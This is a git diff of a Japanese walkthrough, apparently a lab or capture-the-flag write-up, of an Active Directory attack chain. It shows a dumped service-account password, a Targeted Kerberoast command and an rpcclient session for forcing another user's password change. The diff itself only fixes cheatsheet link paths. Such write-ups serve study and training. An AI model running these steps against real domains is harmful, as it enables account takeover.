@@ -42,12 +42,12 @@ id   name               password
  0   b'hrapp-service'   b'Untimed$Runny'   
 ```
 
-7. 入手した認証情報は、ほかユーザーオブジェクトに対して `GenericWrite` をもっていたため、 Targeted Kerberoast を実行（[💥AD Exploit](../../Cheatsheet/🪟Windows/Active%20Directory/💥AD%20Exploit.md#Targeted%20Kerberoast)）
+7. 入手した認証情報は、ほかユーザーオブジェクトに対して `GenericWrite` をもっていたため、 Targeted Kerberoast を実行（[💥AD Exploit](../Cheatsheet/🪟Windows/Active%20Directory/💥AD%20Exploit.md#Targeted%20Kerberoast)）
 ```sh
 python3 targetedKerberoast.py -v -d '<domain>' -u '<username>' -p '<pw>'
 ```
 
-8. Kerberoastして侵害したユーザーが、ほかユーザーオブジェクトに対してForceChangePassword ACE をもっていたため、パスワードを変更（[💥AD Exploit](../../Cheatsheet/🪟Windows/Active%20Directory/💥AD%20Exploit.md#ForceChangePassword)）
+8. Kerberoastして侵害したユーザーが、ほかユーザーオブジェクトに対してForceChangePassword ACE をもっていたため、パスワードを変更（[💥AD Exploit](../Cheatsheet/🪟Windows/Active%20Directory/💥AD%20Exploit.md#ForceChangePassword)）
 ```sh
 rpcclient //<TargetIP> -U <domain>/<username>
 # rpcclient $>プロンプトで
